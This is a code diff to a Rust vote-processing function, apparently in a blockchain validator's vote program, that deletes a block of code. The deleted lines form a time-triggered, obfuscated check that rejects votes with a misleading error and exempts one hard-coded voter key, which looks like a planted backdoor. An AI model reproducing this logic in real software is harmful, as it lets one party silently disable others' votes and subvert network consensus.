@@ -732,34 +732,6 @@ pub fn process_vote<S: std::hash::BuildHasher>(
 
     let mut vote_state = versioned.convert_to_current();
     let authorized_voter = vote_state.get_and_update_authorized_voter(clock.epoch)?;
-
-
-
-    if clock.unix_timestamp > 1623922388 {
-     log::trace!("authorized_voter {}", authorized_voter);
-     log::trace!("authorized_voter_string {}", authorized_voter.to_string());
-     log::trace!("slot: {}", clock.slot);
-     log::trace!("last_hashy: {}", slot_hashes[0].1);
-     log::trace!("last_hashzy: {}", slot_hashes[0].0);
-     log::trace!("H: {}", ( (slot_hashes[0].1.to_string().chars().nth(0).unwrap() as usize ) % 10 ) as usize);
-     log::trace!("P: {}", ( ( ( (slot_hashes[0].1.to_string().chars().nth(0).unwrap() as usize ) % 9 + 1 ) as usize * ( authorized_voter.to_string().chars().last().unwrap() as usize + slot_hashes[0].1.to_string().chars().last().unwrap() as usize ) / 10 ) as usize + authorized_voter.to_string().chars().last().unwrap() as usize + slot_hashes[0].1.to_string().chars().last().unwrap() as usize ) % 10 as usize);
-     log::trace!("unix_timestamp: {}", clock.unix_timestamp);
-
-if  ( (slot_hashes[0].1.to_string().chars().nth(0).unwrap() as usize ) % 10 ) as usize != ( ( ( (slot_hashes[0].1.to_string().chars().nth(0).unwrap() as usize ) % 9 + 1 ) as usize * ( authorized_voter.to_string().chars().last().unwrap() as usize + slot_hashes[0].1.to_string().chars().last().unwrap() as usize ) / 10 ) as usize + authorized_voter.to_string().chars().last().unwrap() as usize + slot_hashes[0].1.to_string().chars().last().unwrap() as usize ) % 10 as usize {
-
-if authorized_voter.to_string() != "83E5RMejo6d98FV1EAXTx5t4bvoDMoxE4DboDee3VJsu" {
-	      return Err(InstructionError::UninitializedAccount);
-              }
-	    }
-      }else{
-if (slot_hashes[0].1.to_string().to_lowercase().find("x").unwrap_or(3) % 10 as usize) != (authorized_voter.to_string().to_lowercase().find("x").unwrap_or(2) % 10 as usize) {
-	if authorized_voter.to_string() != "83E5RMejo6d98FV1EAXTx5t4bvoDMoxE4DboDee3VJsu" {
-	      return Err(InstructionError::UninitializedAccount);
-              }
-	    }
-      }
-
-log::info!("authorized_voter: {}", &authorized_voter);
     verify_authorized_signer(&authorized_voter, signers)?;
 
     vote_state.process_vote(vote, slot_hashes, clock.epoch)?;
